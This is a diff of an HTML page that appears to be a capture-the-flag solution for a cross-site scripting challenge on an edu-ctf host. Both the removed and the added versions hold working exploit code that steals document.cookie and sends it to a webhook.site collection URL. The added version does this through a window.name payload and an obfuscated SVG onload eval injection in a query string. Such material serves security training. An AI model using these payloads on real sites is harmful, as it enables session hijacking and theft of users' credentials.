@@ -1,11 +1,17 @@
-<a id="hi" onclick="getFlag()"></a>
+<!-- <a id="hi" onclick="getFlag()"></a> -->
 <script type="text/javascript">
-    console.log(document.cookie)
-    document.querySelector('#hi').click();
-    function getFlag() {
-        var a = document.cookie;
-        fetch(`https://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?${a}`);
-    }
+    // console.log(document.cookie)
+    // document.querySelector('#hi').click();
+    // function getFlag() {
+    //     var a = document.cookie;
+    //     fetch(`https://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?${a}`);
+    // }
+    window.onload = function() {
+        console.log("window loaded")
+        window.name="document.location=`https://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?`+document.cookie";
+        console.log(window.name)
+        window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG/ONLoAD=eval(n&#97;m\u{65})>";
+    };
     // window.name="document.location=`https://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?`+document.cookie";
     // window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG/ONLoAD=eval(n&#97;m\u{65})>";
 </script>
